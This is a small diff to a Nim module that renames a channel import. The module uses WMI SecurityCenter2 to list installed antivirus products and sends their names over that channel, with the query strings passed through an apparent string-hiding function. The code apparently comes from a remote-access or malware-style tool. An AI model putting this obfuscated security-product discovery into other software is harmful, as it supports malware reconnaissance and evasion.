@@ -7,13 +7,13 @@ from winim/com import get
 
 import ../functions/hideString
 
-from ../channels import mainThread
+from ../channels import mainChannel
 
 proc getAVS(): void =
   var wmi = GetObject d e"winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2"
 
   for av in wmi.execQuery d e"select * from AntivirusProduct":
-    mainThread.send "av: " & $av.displayName
+    mainChannel.send "av: " & $av.displayName
 
 proc initGetAVSThread*(): void {.thread.} =
   getAVS()
